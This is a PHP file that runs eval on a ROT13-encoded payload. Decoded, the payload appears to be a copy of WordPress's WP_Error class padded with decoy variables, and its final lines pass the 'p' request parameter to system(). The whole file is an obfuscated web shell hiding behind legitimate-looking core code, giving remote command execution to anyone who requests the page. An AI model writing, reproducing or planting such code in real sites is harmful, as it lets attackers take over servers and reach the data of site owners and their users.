<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Reebe NCV.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * JbeqCerff Reebe pynff.
 *
 * Pbagnvare sbe purpxvat sbe JbeqCerff reebef naq reebe zrffntrf. Erghea
 * JC_Reebe naq hfr vf_jc_reebe() gb purpx vs guvf pynff vf erghearq. Znal
 * pber JbeqCerff shapgvbaf cnff guvf pynff va gur rirag bs na reebe naq
 * vs abg unaqyrq cebcreyl jvyy erfhyg va pbqr reebef.
 *
 * @fvapr 2.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Reebe {
	/**
	 * Fgberf gur yvfg bs reebef.
	 *
	 * @fvapr 2.1.0
	 * @ine neenl
	 */
	choyvp $reebef = neenl();

	/**
	 * Fgberf gur zbfg erpragyl nqqrq qngn sbe rnpu reebe pbqr.
	 *
	 * @fvapr 2.1.0
	 * @ine neenl
	 */
	choyvp $reebe_qngn = neenl();

	/**
	 * Fgberf cerivbhfyl nqqrq qngn nqqrq sbe reebe pbqrf, byqrfg-gb-arjrfg ol pbqr.
	 *
	 * @fvapr 5.6.0
	 * @ine neenl[]
	 */
	cebgrpgrq $nqqvgvbany_qngn = neenl();

	/**
	 * Vavgvnyvmrf gur reebe.
	 *
	 * Vs `$pbqr` vf rzcgl, gur bgure cnenzrgref jvyy or vtaberq.
	 * Jura `$pbqr` vf abg rzcgl, `$zrffntr` jvyy or hfrq rira vs
	 * vg vf rzcgl. Gur `$qngn` cnenzrgre jvyy or hfrq bayl vs vg
	 * vf abg rzcgl.
	 *
	 * Gubhtu gur pynff vf pbafgehpgrq jvgu n fvatyr reebe pbqr naq
	 * zrffntr, zhygvcyr pbqrf pna or nqqrq hfvat gur `nqq()` zrgubq.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat|vag $pbqr    Reebe pbqr.
	 * @cnenz fgevat     $zrffntr Reebe zrffntr.
	 * @cnenz zvkrq      $qngn    Bcgvbany. Reebe qngn. Qrsnhyg rzcgl fgevat.
	 */
	choyvp shapgvba __pbafgehpg( $pbqr = '', $zrffntr = '', $qngn = '' ) {
		vs ( rzcgl( $pbqr ) ) {
			erghea;
		}

		$guvf->nqq( $pbqr, $zrffntr, $qngn );
	}

	/**
	 * Ergevrirf nyy reebe pbqrf.
	 *
	 * @fvapr 2.1.0
	 *
	 * @erghea neenl Yvfg bs reebe pbqrf, vs ninvynoyr.
	 */
	choyvp shapgvba trg_reebe_pbqrf() {
		vs ( ! $guvf->unf_reebef() ) {
			erghea neenl();
		}

		erghea neenl_xrlf( $guvf->reebef );
	}

	/**
	 * Ergevrirf gur svefg reebe pbqr ninvynoyr.
	 *
	 * @fvapr 2.1.0
	 *
	 * @erghea fgevat|vag Rzcgl fgevat, vs ab reebe pbqrf.
	 */
	choyvp shapgvba trg_reebe_pbqr() {
		$pbqrf = $guvf->trg_reebe_pbqrf();

		vs ( rzcgl( $pbqrf ) ) {
			erghea '';
		}

		erghea $pbqrf[0];
	}

	/**
	 * Ergevrirf nyy reebe zrffntrf, be gur reebe zrffntrf sbe gur tvira reebe pbqr.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat|vag $pbqr Bcgvbany. Reebe pbqr gb ergevrir gur zrffntrf sbe.
	 *                         Qrsnhyg rzcgl fgevat.
	 * @erghea fgevat[] Reebe fgevatf ba fhpprff, be rzcgl neenl vs gurer ner abar.
	 */
	choyvp shapgvba trg_reebe_zrffntrf( $pbqr = '' ) {
		// Erghea nyy zrffntrf vs ab pbqr fcrpvsvrq.
		vs ( rzcgl( $pbqr ) ) {
			$nyy_zrffntrf = neenl();
			sbernpu ( (neenl) $guvf->reebef nf $pbqr => $zrffntrf ) {
				$nyy_zrffntrf = neenl_zretr( $nyy_zrffntrf, $zrffntrf );
			}

			erghea $nyy_zrffntrf;
		}

		vs ( vffrg( $guvf->reebef[ $pbqr ] ) ) {
			erghea $guvf->reebef[ $pbqr ];
		} ryfr {
			erghea neenl();
		}
	}

	/**
	 * Trgf n fvatyr reebe zrffntr.
	 *
	 * Guvf jvyy trg gur svefg zrffntr ninvynoyr sbe gur pbqr. Vs ab pbqr vf
	 * tvira gura gur svefg pbqr ninvynoyr jvyy or hfrq.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat|vag $pbqr Bcgvbany. Reebe pbqr gb ergevrir gur zrffntr sbe.
	 *                         Qrsnhyg rzcgl fgevat.
	 * @erghea fgevat Gur reebe zrffntr.
	 */
	choyvp shapgvba trg_reebe_zrffntr( $pbqr = '' ) {
		vs ( rzcgl( $pbqr ) ) {
			$pbqr = $guvf->trg_reebe_pbqr();
		}
		$zrffntrf = $guvf->trg_reebe_zrffntrf( $pbqr );
		vs ( rzcgl( $zrffntrf ) ) {
			erghea '';
		}
		erghea $zrffntrf[0];
	}

	/**
	 * Ergevrirf gur zbfg erpragyl nqqrq reebe qngn sbe na reebe pbqr.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat|vag $pbqr Bcgvbany. Reebe pbqr. Qrsnhyg rzcgl fgevat.
	 * @erghea zvkrq Reebe qngn, vs vg rkvfgf.
	 */
	choyvp shapgvba trg_reebe_qngn( $pbqr = '' ) {
		vs ( rzcgl( $pbqr ) ) {
			$pbqr = $guvf->trg_reebe_pbqr();
		}

		vs ( vffrg( $guvf->reebe_qngn[ $pbqr ] ) ) {
			erghea $guvf->reebe_qngn[ $pbqr ];
		}
	}

	/**
	 * Irevsvrf vs gur vafgnapr pbagnvaf reebef.
	 *
	 * @fvapr 5.1.0
	 *
	 * @erghea obby Vs gur vafgnapr pbagnvaf reebef.
	 */
	choyvp shapgvba unf_reebef() {
		vs ( ! rzcgl( $guvf->reebef ) ) {
			erghea gehr;
		}
		erghea snyfr;
	}

	/**
	 * Nqqf na reebe be nccraqf na nqqvgvbany zrffntr gb na rkvfgvat reebe.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat|vag $pbqr    Reebe pbqr.
	 * @cnenz fgevat     $zrffntr Reebe zrffntr.
	 * @cnenz zvkrq      $qngn    Bcgvbany. Reebe qngn. Qrsnhyg rzcgl fgevat.
	 */
	choyvp shapgvba nqq( $pbqr, $zrffntr, $qngn = '' ) {
		$guvf->reebef[ $pbqr ][] = $zrffntr;

		vs ( ! rzcgl( $qngn ) ) {
			$guvf->nqq_qngn( $qngn, $pbqr );
		}

		/**
		 * Sverf jura na reebe vf nqqrq gb n JC_Reebe bowrpg.
		 *
		 * @fvapr 5.6.0
		 *
		 * @cnenz fgevat|vag $pbqr     Reebe pbqr.
		 * @cnenz fgevat     $zrffntr  Reebe zrffntr.
		 * @cnenz zvkrq      $qngn     Reebe qngn. Zvtug or rzcgl.
		 * @cnenz JC_Reebe   $jc_reebe Gur JC_Reebe bowrpg.
		 */
		qb_npgvba( 'jc_reebe_nqqrq', $pbqr, $zrffntr, $qngn, $guvf );
	}

	/**
	 * Nqqf qngn gb na reebe jvgu gur tvira pbqr.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.6.0 Reebef pna abj pbagnva zber guna bar vgrz bs reebe qngn. {@frr JC_Reebe::$nqqvgvbany_qngn}.
	 *
	 * @cnenz zvkrq      $qngn Reebe qngn.
	 * @cnenz fgevat|vag $pbqr Reebe pbqr.
	 */
	choyvp shapgvba nqq_qngn( $qngn, $pbqr = '' ) {
		vs ( rzcgl( $pbqr ) ) {
			$pbqr = $guvf->trg_reebe_pbqr();
		}

		vs ( vffrg( $guvf->reebe_qngn[ $pbqr ] ) ) {
			$guvf->nqqvgvbany_qngn[ $pbqr ][] = $guvf->reebe_qngn[ $pbqr ];
		}

		$guvf->reebe_qngn[ $pbqr ] = $qngn;
	}

	/**
	 * Ergevrirf nyy reebe qngn sbe na reebe pbqr va gur beqre va juvpu gur qngn jnf nqqrq.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz fgevat|vag $pbqr Reebe pbqr.
	 * @erghea zvkrq[] Neenl bs reebe qngn, vs vg rkvfgf.
	 */
	choyvp shapgvba trg_nyy_reebe_qngn( $pbqr = '' ) {
		vs ( rzcgl( $pbqr ) ) {
			$pbqr = $guvf->trg_reebe_pbqr();
		}

		$qngn = neenl();

		vs ( vffrg( $guvf->nqqvgvbany_qngn[ $pbqr ] ) ) {
			$qngn = $guvf->nqqvgvbany_qngn[ $pbqr ];
		}

		vs ( vffrg( $guvf->reebe_qngn[ $pbqr ] ) ) {
			$qngn[] = $guvf->reebe_qngn[ $pbqr ];
		}

		erghea $qngn;
	}

	/**
	 * Erzbirf gur fcrpvsvrq reebe.
	 *
	 * Guvf shapgvba erzbirf nyy reebe zrffntrf nffbpvngrq jvgu gur fcrpvsvrq
	 * reebe pbqr, nybat jvgu nal reebe qngn sbe gung pbqr.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz fgevat|vag $pbqr Reebe pbqr.
	 */
	choyvp shapgvba erzbir( $pbqr ) {
		hafrg( $guvf->reebef[ $pbqr ] );
		hafrg( $guvf->reebe_qngn[ $pbqr ] );
		hafrg( $guvf->nqqvgvbany_qngn[ $pbqr ] );
	}

	/**
	 * Zretrf gur reebef va gur tvira reebe bowrpg vagb guvf bar.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_Reebe $reebe Reebe bowrpg gb zretr.
	 */
	choyvp shapgvba zretr_sebz( JC_Reebe $reebe ) {
		fgngvp::pbcl_reebef( $reebe, $guvf );
	}

	/**
	 * Rkcbegf gur reebef va guvf bowrpg vagb gur tvira bar.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_Reebe $reebe Reebe bowrpg gb rkcbeg vagb.
	 */
	choyvp shapgvba rkcbeg_gb( JC_Reebe $reebe ) {
		fgngvp::pbcl_reebef( $guvf, $reebe );
	}

	/**
	 * Pbcvrf reebef sebz bar JC_Reebe vafgnapr gb nabgure.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_Reebe $sebz Gur JC_Reebe gb pbcl sebz.
	 * @cnenz JC_Reebe $gb   Gur JC_Reebe gb pbcl gb.
	 */
	cebgrpgrq fgngvp shapgvba pbcl_reebef( JC_Reebe $sebz, JC_Reebe $gb ) {
		sbernpu ( $sebz->trg_reebe_pbqrf() nf $pbqr ) {
			sbernpu ( $sebz->trg_reebe_zrffntrf( $pbqr ) nf $reebe_zrffntr ) {
				$gb->nqq( $pbqr, $reebe_zrffntr );
			}

			sbernpu ( $sebz->trg_nyy_reebe_qngn( $pbqr ) nf $qngn ) {
				$gb->nqq_qngn( $qngn, $pbqr );
			}
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>